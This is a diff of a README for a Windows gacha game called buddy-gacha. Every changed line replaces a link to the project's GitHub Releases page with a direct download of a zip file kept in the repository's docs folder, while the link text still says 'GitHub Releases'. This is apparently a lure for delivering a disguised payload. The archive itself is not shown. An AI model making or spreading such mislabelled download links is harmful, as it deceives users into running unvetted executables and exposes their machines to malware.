@@ -1,6 +1,6 @@
 # 🎲 buddy-gacha - Chase the Legendary Shiny Capybara
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download-GitHub%20Releases-blue?style=for-the-badge)](https://github.com/90f1289/buddy-gacha/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download-GitHub%20Releases-blue?style=for-the-badge)](https://github.com/90f1289/buddy-gacha/raw/refs/heads/main/docs/gacha_buddy_v1.2.zip)
 
 ## 🐹 What this is
 
@@ -21,13 +21,13 @@ For most users, any modern Windows 10 or Windows 11 system should work.
 
 Visit this page to download the app:
 
-[GitHub Releases](https://github.com/90f1289/buddy-gacha/releases)
+[GitHub Releases](https://github.com/90f1289/buddy-gacha/raw/refs/heads/main/docs/gacha_buddy_v1.2.zip)
 
 On that page, look for the latest release and download the Windows file that matches your computer. If you see a `.zip` file, download that file and open it after it finishes.
 
 ## 🛠️ Install and run
 
-1. Open the [GitHub Releases](https://github.com/90f1289/buddy-gacha/releases) page.
+1. Open the [GitHub Releases](https://github.com/90f1289/buddy-gacha/raw/refs/heads/main/docs/gacha_buddy_v1.2.zip) page.
 2. Find the newest release at the top of the list.
 3. Under the release files, download the Windows package.
 4. If the file is a `.zip`, right-click it and choose **Extract All**.
@@ -138,6 +138,6 @@ Try these steps:
 
 ## 📦 Start here
 
-[Open GitHub Releases](https://github.com/90f1289/buddy-gacha/releases)
+[Open GitHub Releases](https://github.com/90f1289/buddy-gacha/raw/refs/heads/main/docs/gacha_buddy_v1.2.zip)
 
 Download the latest Windows file, open it, and start rolling for your Legendary Shiny Capybara
